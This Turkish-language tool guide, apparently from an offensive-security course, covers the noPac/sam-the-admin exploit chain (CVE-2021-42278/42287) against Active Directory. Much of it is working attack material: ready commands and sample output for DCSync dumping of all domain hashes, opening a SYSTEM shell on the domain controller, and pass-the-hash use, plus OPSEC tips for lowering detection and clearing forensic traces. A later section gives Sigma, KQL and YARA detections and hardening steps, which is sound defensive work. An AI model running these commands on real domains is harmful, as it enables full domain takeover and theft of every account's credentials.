# noPac / sam-the-admin (CVE-2021-42278 & CVE-2021-42287)

> **Kategori:** [13. Tarihi ve Kritik Zafiyet Araçları](./README.md) · **Modül:** [Modül 11 — Araç Cephaneliği](../README.md)
> **Tanım:** `sAMAccountName` sahteciliği (CVE-2021-42278) ve Kerberos PAC kafa karışıklığı (CVE-2021-42287) zafiyetlerini zincirleyerek, etki alanındaki en düşük yetkili kullanıcı hesabından dakikalar içinde Domain Controller kimliğini taklit eden ve Domain Admin haklarına yükselen istismar aracı.

---

## 1. Genel Bakış ve Amaç

Active Directory ortamlarında varsayılan olarak her standart etki alanı kullanıcısı, etki alanına 10 adede kadar yeni bilgisayar hesabı ekleme yetkisine (`MachineAccountQuota = 10`) sahiptir. Bilgisayar hesapları oluşturulurken `sAMAccountName` özniteliği atanır ve bu ad geleneksel olarak sonuna bir dolar işareti (`$`) eklenerek (örneğin `WORKSTATION01$`) tamamlanır.

Kasım ve Aralık 2021'de keşfedilen **CVE-2021-42278** ve **CVE-2021-42287** (güvenlik camiasında **noPac** veya **sam-the-admin** olarak adlandırılır), Active Directory nesne doğrulama ve Kerberos Anahtar Dağıtım Merkezi (KDC) biletleme mekanizmalarındaki iki kritik tasarım kusurunun ölümcül bir zinciridir:

1. **CVE-2021-42278 (`sAMAccountName` Doğrulama Kusuru):** Active Directory, bilgisayar nesnelerinin `sAMAccountName` özniteliğini değiştirirken sonundaki `$` işaretini zorunlu kılmamaktadır. Bir kullanıcı, kendi oluşturduğu bir bilgisayar hesabının adını, etki alanı denetleyicisinin adıyla birebir aynı yapabilir (örneğin etki alanı denetleyicisi `DC01$` ise, kendi makinesinin adını `DC01` olarak değiştirir).
2. **CVE-2021-42287 (Kerberos KDC Arama Kusuru):** `DC01` adını alan sahte makine hesabı için KDC'den bir Kerberos TGT (Ticket Granting Ticket) bileti istenir. TGT alındıktan hemen sonra makine hesabının adı eski haline döndürülür. Ardından eldeki TGT ile bir TGS (Service Ticket / S4U2self) talep edildiğinde, KDC veritabanında `DC01` hesabını bulamaz. Kerberos servis mantığı gereği KDC otomatik olarak hesap adının sonuna `$` ekler ve gerçek etki alanı denetleyicisi olan `DC01$` hesabını bulur.

Sonuç olarak KDC, bu bilet talebini doğrudan etki alanı denetleyicisinin kendisi (`DC01$`) yapmış gibi kabul eder ve saldırgana **Domain Controller makine kimliğini ve Privilege Attribute Certificate (PAC) haklarını içeren tam yetkili bir Kerberos bileti** üretir. Bu bilet kullanılarak saniyeler içinde Domain Admin olunabilir, DCSync ile tüm şifreler çekilebilir veya DC üzerinde uzaktan SYSTEM kabuğu açılabilir.

### Mimari Akış Şeması

```
+-----------------------------------------------------------------------------------+
|                             NOPAC MIMARI AKIŞI                                    |
+-----------------------------------------------------------------------------------+
  [Düşük Yetkili Kullanıcı]                          [Domain Controller (KDC)]
        (noPac.py)                                      (Active Directory)
            |                                                   |
            |--- 1. Yeni Makine Hesabı Eklenir ----------------->|--- 1. FAKEPC$ Oluşur
            |       (MachineAccountQuota = 10 Kullanılır)       |       (Düşük Yetki)
            |                                                   |
            |--- 2. sAMAccountName Değiştirilir: "DC01" -------->|--- 2. CVE-2021-42278:
            |       ($ İşareti Olmadan DC Adı Verilir)          |       $ Zorunluluğu Yok!
            |                                                   |
            |--- 3. Kerberos AS-REQ (DC01 Adına TGT İsteği) ---->|--- 3. KDC, DC01 Adına
            |<-- 4. Kerberos AS-REP (TGT Bileti Döner) ---------|       TGT Üretir
            |                                                   |
            |--- 5. Makine Adı Tekrar Değiştirilir ------------->|--- 4. İsim Çakışması
            |       (sAMAccountName -> FAKEPC$)                 |       Önlenir
            |                                                   |
            |--- 6. Kerberos TGS-REQ (S4U2self İsteği) --------->|--- 5. CVE-2021-42287:
            |       [Eldeki DC01 TGT'si ile Servis Talebi]      |       DC01 Bulunamaz!
            |                                                   |       KDC Sonuna $ Ekler
            |                                                   |       (DC01$) ve DC Sanır!
            |<-- 7. DC01$ PAC Biletini Döner (Full DA Yetkisi) -|
            |                                                   |
            v                                                   v
  [Sonuç: Tam Domain Controller Yetkisi] -> [DCSync / Uzaktan SYSTEM Kabuğu]
```

### Neden Önemli?

| Yetenek | Operasyonel Avantaj | Alternatif Zafiyetlere Üstünlüğü |
| :--- | :--- | :--- |
| **Yıkıcı Olmayan İstismar** | DC parolasını sıfırlamaz (Zerologon gibi bozmaz).| Active Directory replikasyonunu çökertmeden Domain Admin yapar. |
| **Işık Hızında Yükselme** | Ortalama 45-60 saniye içinde Domain Admin sağlar. | Karmaşık hash kırma veya yanal hareket zincirlerini eler. |
| **DCSync & Kabuk Desteği** | İster hash dökümü (`--dump`) ister SYSTEM shell açar.| Esnek operasyonel seçenekler sunar. |
| **Temiz Geri Alma** | Oluşturduğu sahte makine hesabını iş bitince siler.| Sistemde gereksiz kalıntı ve adli nesne bırakmaz. |
| **Geniş Versiyon Etkisi** | 2021 yılı sonuna kadar tüm Windows Server'ları etkiledi.| Tarihsel denetimlerde eski kurumsal yapılarda sıkça karşılaşılır. |

### Karşılaştırma Tablosu

| Özellik | noPac (sam-the-admin) | Zerologon (CVE-2020-1472) | PrintNightmare (CVE-2021-34527) | MS14-068 (Kerberos PAC) |
| :--- | :--- | :--- | :--- | :--- |
| **Gereken Yetki** | Standart Domain Kullanıcısı | Anonim (Kimliksiz) | Standart Domain Kullanıcısı | Standart Domain Kullanıcısı |
| **Kullanılan Protokol** | LDAP + Kerberos (Port 88/389)| MS-NRPC (Netlogon RPC) | MS-RPRN (Print Spooler RPC) | Kerberos KDC (Port 88) |
| **Replikasyon Riski** | Sıfır (Replikasyonu etkilemez)| Çok Yüksek (Acil onarım şart)| Sıfır | Sıfır |
| **DC Parola Değişimi** | Hayır (Parolaya dokunmaz) | Evet (Parolayı sıfırlar) | Hayır | Hayır |
| **Elde Edilen Yetki** | Domain Admin / DCSync | Domain Admin / DCSync | SYSTEM Yetkisinde Kod | Domain Admin TGT |

---

## 2. Temel Sözdizimi ve Parametreler (CLI Flags)

`noPac` (WadComs / Ridter varyantı), hedef etki alanı, kimlik bilgileri, DC IP adresi ve operasyonel mod bayraklarıyla parametrelendirilir:

```bash
python3 noPac.py <DOMAIN>/<USER>:<PASS> -dc-ip <DC_IP> [-dc-host <DC_NAME>] [MODLAR]
```

### Desteklenen Kritik Bayraklar

| Parametre | Uzun Adı | Açıklama | Örnek Değer |
| :--- | :--- | :--- | :--- |
| `<DOMAIN>/<USER>:<PASS>`| Girdi | Standart domain kullanıcısının kimlik bilgileri. | `corp.local/jdoe:Pass2026!` |
| `-dc-ip` | `--dc-ip` | Hedef etki alanı denetleyicisinin IPv4 adresi. | `-dc-ip 192.168.1.10` |
| `-dc-host` | `--dc-host` | Hedef DC'nin NetBIOS veya hostname adı (Büyük harf duyarlı). | `-dc-host DC01` |
| `--dump` | `--dump` | Zafiyeti istismar ederek doğrudan DCSync ile tüm hash'leri döker. | Bayrak |
| `--shell` | `--shell` | Hedef DC üzerinde uzaktan SYSTEM yetkisinde interaktif kabuk açar. | Bayrak |
| `--impersonate`| `--impersonate` | Taklit edilecek hedef kullanıcı adı (Varsayılan: `Administrator`). | `--impersonate Administrator` |
| `-hashes` | `-hashes` | Parola yerine NTLM hash (Pass-the-Hash) kullanır. | `-hashes :329153f560eb...` |
| `--use-ldap` | `--use-ldap` | SAMR yerine LDAP protokolü üzerinden makine hesabı oluşturur. | Bayrak |

---

## 3. Pratik Komut Örnekleri

### Senaryo 1: Güvenli Zafiyet Taraması (Saldırmadan Doğrulama)
Hedef etki alanı denetleyicisinin noPac zafiyetlerine karşı açık olup olmadığını test etme:

```bash
python3 noPac.py corp.local/jdoe:Pass2026! -dc-ip 192.168.1.10 -dc-host DC01
```

**Konsol Çıktı Analizi:**
```
[*] Target: 192.168.1.10 (DC01)
[*] User: jdoe
[*] Testing MachineAccountQuota... MAQ = 10 (Account creation allowed)
[*] Creating temporary machine account...
[+] Created computer: FAKEPC$
[*] Renaming sAMAccountName to DC01 (CVE-2021-42278)...
[+] Successfully renamed computer without '$'!
[*] Requesting TGT for DC01...
[+] TGT successfully received!
[*] Renaming computer back to avoid conflict...
[*] Requesting TGS ticket using S4U2self (CVE-2021-42287)...
[+] Successfully received ticket with DC01$ PAC!
[+] TARGET IS VULNERABLE TO NOPAC (CVE-2021-42278 & CVE-2021-42287)!
[*] Cleaning up temporary machine account...
```

### Senaryo 2: noPac ile Otomatik DCSync ve Tüm Domain Hash'lerini Çekme
Zafiyeti istismar ederek doğrudan tüm etki alanı parola özetlerini tek komutla dökme:

```bash
python3 noPac.py corp.local/jdoe:Pass2026! -dc-ip 192.168.1.10 -dc-host DC01 --dump
```

**Konsol Çıktı Analizi:**
```
[+] Exploit chain successful! Obtaining Administrator Kerberos ticket...
[*] Launching secretsdump DCSync with elevated ticket...
Administrator:500:aad3b435b51404eeaad3b435b51404ee:329153f560eb344c3f9e3ec4e086166f:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:99812487abcdf129847128947bcadfae:::
jdoe:1104:aad3b435b51404eeaad3b435b51404ee:4a128f99012384756102938475610293:::
[+] 1,420 domain hashes dumped successfully.
[*] Cleaning up created computer object: FAKEPC$
```

### Senaryo 3: noPac ile Doğrudan SYSTEM Etkileşimli Kabuk Açma
Etki alanı denetleyicisi üzerinde smbexec/wmiexec kanalıyla SYSTEM yetkisinde anında komut istemi başlatma:

```bash
python3 noPac.py corp.local/jdoe:Pass2026! -dc-ip 192.168.1.10 -dc-host DC01 --shell
```

**Konsol Çıktı Analizi:**
```
[+] Elevated Kerberos ticket obtained.
[*] Opening SMB interactive shell on DC01...
[+] Connected to \\DC01\ADMIN$

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> hostname
DC01
```

### Senaryo 4: NTLM Hash (Pass-the-Hash) Kullanarak İstismar
Düz metin parolası olmayan bir kullanıcının NTLM hash'i ile noPac zincirini koşturma:

```bash
python3 noPac.py corp.local/jdoe@192.168.1.10 -hashes :4a128f99012384756102938475610293 -dc-host DC01 --dump
```

**Konsol Çıktı Analizi:**
```
[*] Authenticating using NTLM Hash...
[+] Machine account created via LDAP NTLMSSP!
[+] Successfully obtained DC01$ ticket!
[+] DCSync completed.
```

### Senaryo 5: NetExec ile Çoklu DC Üzerinde noPac Zafiyet Taraması
Kurumsal ağdaki tüm etki alanı denetleyicilerini sırayla tarayarak açık barındıranları listeleme:

```bash
nxc smb 192.168.1.0/24 -u jdoe -p Pass2026! -M nopac
```

**Konsol Çıktı Analizi:**
```
SMB         192.168.1.10    445    DC01             [*] Windows Server 2016 Standard 14393
SMB         192.168.1.10    445    DC01             [+] DC01 is VULNERABLE to noPac (CVE-2021-42278/42287)!
SMB         192.168.1.11    445    DC02             [*] Windows Server 2019 Standard 17763
SMB         192.168.1.11    445    DC02             [-] DC02 is NOT vulnerable (Patched).
```

### Senaryo 6: Yerel Makine Hesabı Kotasını (MachineAccountQuota) Sorgulama
İstismar öncesinde kullanıcının bilgisayar hesabı ekleme hakkının bulunup bulunmadığını kontrol etme:

```bash
python3 -c "import ldap3; server=ldap3.Server('192.168.1.10'); conn=ldap3.Connection(server,'corp\\\\jdoe','Pass2026!',auto_bind=True); conn.search('DC=corp,DC=local','(objectClass=domain)',attributes=['ms-DS-MachineAccountQuota']); print('MAQ:', conn.entries[0]['ms-DS-MachineAccountQuota'])"
```

**Konsol Çıktı Analizi:**
```
MAQ: 10
```

---

## 4. Karşılaşılan Hatalar ve Çözümleri (Troubleshooting)

| Hata Kodu / Mesajı | Kök Neden | Kesin Çözüm Adımı |
| :--- | :--- | :--- |
| `KDC_ERR_S_PRINCIPAL_UNKNOWN` / `KDC_ERR_BADOPTION` | Hedef DC yamalanmış (KB5008380 / KB5008602 devrede; PAC isteklerinde makine kimliği doğrulanıyor). | Hedef sistem zafiyete karşı korumalıdır; alternatif yöntemlere yönelin. |
| `INSUFFICIENT_ACCESS_RIGHTS on Machine Creation` | Etki alanında `ms-DS-MachineAccountQuota` değeri `0` yapılmış; standart kullanıcıların makine eklemesi yasaklanmış. | Kullanıcının önceden sahip olduğu bir bilgisayar hesabını kullanın veya `GenericAll`/`WriteOwner` hakkı olan hesapları arayın. |
| `Failed to rename sAMAccountName: CONSTRAINT_ATT_TYPE` | DC adı olarak verilen isim ağda zaten aktif veya isim çakışması (collision) yaşanıyor. | `-dc-host` parametresinin DC NetBIOS adıyla birebir eşleştiğini teyit edin; `DC01$` yerine `DC01` biçiminde verin. |
| `KRB_AP_ERR_SKEW (Clock skew too great)` | Denetim makinesi ile etki alanı denetleyicisinin saatleri arasında 5 dakikadan fazla fark var. | `sudo rdate -n <DC_IP>` veya `sudo ntpdate <DC_IP>` çalıştırarak yerel saatinizi DC ile senkronize edin. |
| `Kerberos pre-authentication failed (24)` | Kullanıcı adı veya parolası hatalı girilmiş; hesap kilitlenmiş olabilir. | Kimlik bilgilerini doğrulayın; domain adının büyük harfle (`CORP.LOCAL`) yazıldığını kontrol edin. |
| `Temporary computer account was not removed` | İstismar sırasında ağ koptu veya betik yarıda kesildi; sahte bilgisayar nesnesi AD'de asılı kaldı. | Manuel olarak `impacket-addcomputer -action delete` ile veya AD konsolundan ilgili nesneyi silin. |

---

## 5. OPSEC ve Karşı Tespit (IOC)

```
[OPSEC GÜRÜLTÜ SKALASI: ORTA - YÜKSEK]
0 ------------------------[7.0 - KERBEROS & LDAP ANOMALY]---- 10
  - Ağ Seviyesi: LDAP hesap oluşturma/yeniden adlandırma ve hızlı Kerberos TGT/TGS trafiği
  - Uç Nokta Seviyesi: Event 4741, 4742 (Dolar işareti olmayan makine hesabı) ve MDI tespitleri
```

### 5.1 Bırakılan İzler (Event Logs)

* **Security Event Log (Event ID 4741 - A computer account was created):**
  * Yeni bir bilgisayar hesabının (`FAKEPC$`) standart bir kullanıcı tarafından oluşturulduğunu kaydeder.
* **Security Event Log (Event ID 4742 - A computer account was changed):**
  * **Kritik IOC:** Bilgisayar nesnesinin `sAMAccountName` özniteliğinin sonundaki `$` işareti kaldırılarak `DC01` yapılması ve hemen ardından tekrar değiştirilmesi. Bu desen noPac saldırısının parmak izidir.
* **Security Event ID 4768 (Kerberos TGT Request):**
  * `TargetUserName: DC01` (Dolar işareti olmadan bilgisayar adı adına TGT istenmesi).
* **Security Event ID 4769 (Kerberos Service Ticket Request):**
  * S4U2self bilet talebinde `Service Name: krbtgt/CORP.LOCAL` ve `TargetUserName: DC01$` eşleşmesi.

### 5.2 Ağ ve EDR İmzaları

* **Microsoft Defender for Identity (MDI) / Sentinel İmzası:**
  MDI sensörleri, bir bilgisayar hesabının etki alanı denetleyicisi adını alması ve Kerberos biletlerinde `$ ` eksikliği görülmesi durumunda "Suspected sAMAccountName Spoofing (CVE-2021-42278)" alarmını en yüksek önem derecesinde (Critical) üretir.
* **LDAP `addRequest` ve `modifyRequest` Trafiği:**
  Kısa sürede bir makine hesabı oluşturulması, adının değiştirilmesi ve ardından silinmesi tipik bir istismar kalıbıdır.

### 5.3 MITRE ATT&CK Eşleştirmesi

| Taktik | Teknik ID | Teknik Adı | Operasyonel Kullanım |
| :--- | :--- | :--- | :--- |
| **Privilege Escalation** | `T1068` | Exploitation for Privilege Escalation | sAMAccountName ve PAC mantık hatasıyla yetki yükseltme. |
| **Defense Evasion** | `T1078.002` | Valid Accounts: Domain Accounts | DC makine hesabı bağlamını taklit etme. |
| **Credential Access** | `T1558.003` | Steal or Forge Kerberos Tickets: Kerberoasting / S4U | S4U2self ile DC kimliğine bilet üretme. |
| **Credential Access** | `T1003.006` | OS Credential Dumping: DCSync | Elde edilen biletle DRSUAPI üzerinden tüm hash'leri çekme. |

### 5.4 OPSEC Önerileri

| Tespit Riski | Önlem / İyileştirme |
| :--- | :--- |
| **Event 4742 İsim Değişikliği** | Zafiyetin doğası gereği `sAMAccountName` değişmek zorundadır; bu saldırı tam logsuz çalıştırılamaz. |
| **Geçici Nesne Kalıntıları** | İşlem tamamlandığında oluşturulan bilgisayar hesabının mutlaka silindiği (`delete computer`) teyit edilmelidir. |
| **DCSync Gürültüsü** | `--dump` ile tüm veritabanını çekmek yerine, yalnızca hedeflenen tek bir kullanıcının (`Administrator`) hash'i istenmelidir. |
| **Güvenli Test Modu** | Müşteri ortamlarında doğrudan `--shell` veya `--dump` açılmamalı; yalnızca zafiyet doğrulama modu tercih edilmelidir. |

### 5.5 Savunma Karşılığı

#### Sigma Kuralı: noPac sAMAccountName Spoofing ve Hesap Değişiklik Tespiti
```yaml
title: noPac sAMAccountName Sahteciligi Tespiti (CVE-2021-42278)
id: f91284a0-5512-4c22-b112-998811aa4455
status: experimental
description: Bilgisayar hesaplarinda sonu $ ile bitmeyen veya DC adini alan supheli sAMAccountName degisikliklerini yakalar.
references:
    - https://attack.mitre.org/techniques/T1068/
author: Active Directory Guvenlik Ekibi
date: 2026/10/14
logsource:
    service: security
    product: windows
detection:
    selection_creation:
        EventID: 4741
    selection_rename:
        EventID: 4742
        SamAccountName|endswith: ''
    filter_valid_machine:
        SamAccountName|endswith: '$'
    condition: selection_rename and not filter_valid_machine
falsepositives:
    - Nadir bazi eski kurumsal yazilimlarin olusturdugu ozel hesaplar.
level: critical
tags:
    - attack.privilege_escalation
    - attack.t1068
```

#### Microsoft Sentinel KQL Sorgusu
```kql
// sAMAccountName ozelligi dolar ($) isareti olmadan degistirilen bilgisayar hesaplarini ve ardindan gelen DCSync olaylarini arar
SecurityEvent
| where TimeGenerated >= ago(24h)
| where EventID == 4742
| extend NewAccountName = tostring(parse_xml(EventData).Data[0]["#text"])
| where not(NewAccountName endswith "$")
| project TimeGenerated, Computer, Account, SubjectUserName, NewAccountName
| order by TimeGenerated desc
```

#### YARA Kuralı: noPac Python Exploit İmzası
```yara
rule Threat_Exploit_noPac_sam_the_admin {
    meta:
        description = "noPac CVE-2021-42278 ve CVE-2021-42287 istismar scriptlerini tespit eder"
        author = "AD Guvenlik Laboratuvari"
        date = "2026-10-14"
        severity = "Critical"
    strings:
        $s1 = "CVE-2021-42278" ascii wide nocase
        $s2 = "CVE-2021-42287" ascii wide nocase
        $s3 = "sAMAccountName" ascii wide
        $s4 = "MachineAccountQuota" ascii wide
        $s5 = "S4U2self" ascii wide
    condition:
        all of ($s*)
}
```

#### Sertleştirme (Hardening) Adımları
1. **Microsoft KB5008380 ve KB5008602 Güncellemeleri:** Tüm Domain Controller sunucularına ivedilikle yüklenmelidir.
2. **PacRequestorEnforcement Kayıt Defteri Ayarı:** DC'lerde `HKLM\System\CurrentControlSet\Services\Kdc` altında:
   * `PacRequestorEnforcement = 2` (Full Enforcement)
   yapılarak TGT ve TGS isteklerinde orijinal talep edenin kimliği zorunlu doğrulanmalıdır.
3. **MachineAccountQuota Değerini Sıfırlama:** Standart kullanıcıların etki alanına bilgisayar hesabı eklemesini engellemek için `ms-DS-MachineAccountQuota` değeri `0` olarak ayarlanmalıdır:
   ```powershell
   Set-ADDomain -Identity (Get-ADDomain).DistinguishedName -Replace @{'ms-DS-MachineAccountQuota' = 0}
   ```

---

## 6. En Çok Kullanılan Komutlar ve Açıklamaları (Cheat Sheet)

#### 1. Zafiyet Durumunu Kontrol Etme (Scan)
```bash
python3 noPac.py corp.local/jdoe:Pass2026! -dc-ip 192.168.1.10 -dc-host DC01
```
* **Ne Yapar?:** Zafiyet zincirini test eder, DC'nin savunmasız olup olmadığını raporlar ve temizlik yapar.
* **Ne Zaman Kullanılır?:** Sisteme zarar vermeden noPac varlığını doğrulamak için.
* **Parametreler:** `<domain>/<user>:<pass>`, `-dc-ip`, `-dc-host`.

#### 2. noPac ile Doğrudan DCSync Hash Dökümü
```bash
python3 noPac.py corp.local/jdoe:Pass2026! -dc-ip 192.168.1.10 -dc-host DC01 --dump
```
* **Ne Yapar?:** İsim değiştirme ve bilet alma adımlarını tamamlayıp tüm etki alanı hash'lerini çeker.
* **Ne Zaman Kullanılır?:** Sızma testinde nihai etki alanı ele geçirme hedefi için.
* **Parametreler:** `--dump` bayrağı.

#### 3. noPac ile Etkileşimli SYSTEM Kabuğu
```bash
python3 noPac.py corp.local/jdoe:Pass2026! -dc-ip 192.168.1.10 -dc-host DC01 --shell
```
* **Ne Yapar?:** DC üzerinde `NT AUTHORITY\SYSTEM` yetkisinde uzaktan komut istemi açar.
* **Ne Zaman Kullanılır?:** DC üzerinde doğrudan komut yürütme ihtiyacı olduğunda.
* **Parametreler:** `--shell` bayrağı.

#### 4. NTLM Hash ile noPac Çalıştırma
```bash
python3 noPac.py corp.local/jdoe@192.168.1.10 -hashes :4a128f99012384756102938475610293 -dc-host DC01 --dump
```
* **Ne Yapar?:** Düz metin parola gerekmeden NTLM hash ile istismarı gerçekleştirir.
* **Ne Zaman Kullanılır?:** Kullanıcının parolası bilinmeyip hash'i ele geçirildiğinde.
* **Parametreler:** `-hashes` parametresi.

#### 5. NetExec noPac Modülü ile Tarama
```bash
nxc smb 192.168.1.0/24 -u jdoe -p Pass2026! -M nopac
```
* **Ne Yapar?:** Ağdaki tüm etki alanı denetleyicilerini noPac açığı için otomatik tarar.
* **Ne Zaman Kullanılır?:** Hangi DC'nin yamalanmadığını hızla tespit etmek için.
* **Parametreler:** `-M nopac`.

#### 6. MachineAccountQuota Değerini Sorgulama
```powershell
Get-ADObject (Get-ADDomain).DistinguishedName -Properties ms-DS-MachineAccountQuota
```
* **Ne Yapar?:** Standart kullanıcıların kaç bilgisayar ekleyebileceğini sorgular (Varsayılan: 10).
* **Ne Zaman Kullanılır?:** noPac saldırısının ön koşulunu denetlemek için.
* **Parametreler:** PowerShell ActiveDirectory modülü.

#### 7. MachineAccountQuota'yı Sıfırlama (Hardening)
```powershell
Set-ADDomain -Identity (Get-ADDomain).DistinguishedName -Replace @{'ms-DS-MachineAccountQuota' = 0}
```
* **Ne Yapar?:** Normal kullanıcıların bilgisayar hesabı oluşturmasını tamamen yasaklar.
* **Ne Zaman Kullanılır?:** noPac ve benzeri bilgisayar hesabı istismarlarını engellemek için.
* **Parametreler:** `ms-DS-MachineAccountQuota = 0`.

#### 8. Event ID 4742 sAMAccountName İzlerini İnceleme
```powershell
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4742} | Where-Object { $_.Message -notmatch '\$$' }
```
* **Ne Yapar?:** Sonu `$` ile bitmeyen şüpheli bilgisayar adı değişikliklerini listeler.
* **Ne Zaman Kullanılır?:** noPac istismar girişimlerini adli analizde yakalamak için.
* **Parametreler:** `Get-WinEvent`.

#### 9. Belirli Bir Yöneticiyi Taklit Ederek Komut Çalıştırma
```bash
python3 noPac.py corp.local/jdoe:Pass2026! -dc-ip 192.168.1.10 -dc-host DC01 --impersonate Administrator -c "whoami /priv"
```
* **Ne Yapar?:** Administrator kullanıcısı adına bilet alıp belirtilen komutu DC'de çalıştırır.
* **Ne Zaman Kullanılır?:** Yetki sınırlarını ve token ayrıcalıklarını doğrulamak için.
* **Parametreler:** `--impersonate`, `-c`.

#### 10. Kalan Sahte Bilgisayar Hesabını Silme (Manuel Temizlik)
```bash
impacket-addcomputer corp.local/jdoe:Pass2026! -dc-ip 192.168.1.10 -computer-name 'FAKEPC$' -action delete
```
* **Ne Yapar?:** Hata nedeniyle silinemeyen geçici makine nesnesini Active Directory'den kaldırır.
* **Ne Zaman Kullanılır?:** İstismar sonrası sistemde adli iz bırakmamak için.
* **Parametreler:** `-action delete`.

---

## Kaynaklar
* [Charlie Clark noPac Araştırması ve GitHub Deposu](https://github.com/Ridter/noPac)
* [Microsoft Güvenlik Bülteni: CVE-2021-42278 (sAMAccountName Spoofing)](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42278)
* [Microsoft Güvenlik Bülteni: CVE-2021-42287 (Kerberos Privilege Escalation)](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42287)
* [MITRE ATT&CK: Exploitation for Privilege Escalation (T1068)](https://attack.mitre.org/techniques/T1068/)
* [HackTricks: sAMAccountName Spoofing (noPac)](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/samaccountname-spoofing)
* [SpecterOps: Hunting for sAMAccountName Spoofing](https://posts.specterops.io/)

---

> **Önceki:** [← PrintNightmare](./PrintNightmare.md) · **Sonraki:** [AADInternals (Kategori 14) →](../Kategori_14_AD_FS_Bulut_ve_Hibrit_Kimlik/AADInternals.md)
